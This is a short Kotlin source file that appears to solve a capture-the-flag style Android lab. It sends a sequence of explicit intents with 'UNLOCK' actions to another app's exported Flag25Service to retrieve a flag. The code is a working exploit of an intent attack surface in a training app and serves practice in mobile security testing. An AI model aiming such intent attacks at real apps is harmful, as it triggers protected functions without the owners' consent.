package com.pachinko.intentattacksurface.utils

import android.content.Context
import android.content.Intent
import android.util.Log
import kotlinx.coroutines.delay
import kotlinx.coroutines.runBlocking
import kotlin.time.Duration.Companion.milliseconds

object Flag25 {
    fun getFlag(context: Context) {
        for(lock in 1..3) {
            val intent = Intent().apply {
                setClassName(
                    "io.hextree.attacksurface",
                    "io.hextree.attacksurface.services.Flag25Service"
                )
                action = "io.hextree.services.UNLOCK${lock}"
            }
            runBlocking {
                delay(3000.milliseconds)
                context.startService(intent)
            }
        }
    }
}
